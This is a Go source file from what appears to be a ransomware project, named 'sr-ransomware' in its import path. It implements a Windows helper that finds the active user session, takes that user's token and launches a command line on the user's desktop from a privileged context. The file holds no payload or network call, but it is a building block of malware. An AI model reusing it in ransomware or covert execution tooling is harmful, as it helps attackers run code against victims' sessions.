// +build windows

package win

import (
    "unsafe"
    "syscall"

    "golang.org/x/sys/windows"
    "github.com/sug0/sr-ransomware/go/errors"
)

func LaunchProcess(commandLine string) error {
    sessionID, err := getCurrentSessionID()
    if err != nil {
        return errors.Wrap(pkg, "failed to get session id", err)
    }
    if sessionID == 0 {
        return errNotLoggedIn
    }

    var hToken windows.Token
    err = windows.WTSQueryUserToken(sessionID, &hToken);
    if err != nil {
        return errors.Wrap(pkg, "failed to query user token", err)
    }
    defer hToken.Close()

    var environment *uint16
    err = windows.CreateEnvironmentBlock(&environment, hToken, true)
    if err != nil {
        return errors.Wrap(pkg, "failed to create env block", err)
    }
    defer windows.DestroyEnvironmentBlock(environment)

    si := syscall.StartupInfo{
        Desktop: syscall.StringToUTF16Ptr("winsta0\\default"),
    }
    var pi syscall.ProcessInformation

    // Do NOT want to inherit handles here
    err = syscall.CreateProcessAsUser(
        syscall.Token(hToken),
        nil,
        syscall.StringToUTF16Ptr(commandLine),
        nil,
        nil,
        false,
        windows.NORMAL_PRIORITY_CLASS | windows.CREATE_UNICODE_ENVIRONMENT,
        environment,
        nil,
        &si,
        &pi,
    )
    if err != nil {
        return errors.Wrap(pkg, "failed to create process", err)
    }
    syscall.CloseHandle(pi.Thread)
    syscall.CloseHandle(pi.Process)

    return nil
}

func getCurrentSessionID() (uint32, error) {
    var pSessionInfo *windows.WTS_SESSION_INFO
    var nSessions uint32

    err := windows.WTSEnumerateSessions(0, 0, 1, &pSessionInfo, &nSessions)
    if err != nil {
        return 0, err
    }
    defer windows.WTSFreeMemory(uintptr(unsafe.Pointer(pSessionInfo)))

    sess := getSessionArray(pSessionInfo, nSessions)

    for i := 0; i < len(sess); i++ {
        if sess[i].State == windows.WTSActive {
            return sess[i].SessionID, nil
        }
    }

    return 0, nil
}

func getSessionArray(pSessionInfo *windows.WTS_SESSION_INFO, nSessions uint32) []windows.WTS_SESSION_INFO {
    type slice struct {
        Data uintptr
        Len  int
        Cap  int
    }
    return *(*[]windows.WTS_SESSION_INFO)(unsafe.Pointer(&slice{
        Data: uintptr(unsafe.Pointer(pSessionInfo)),
        Len: int(nSessions),
        Cap: int(nSessions),
    }))
}
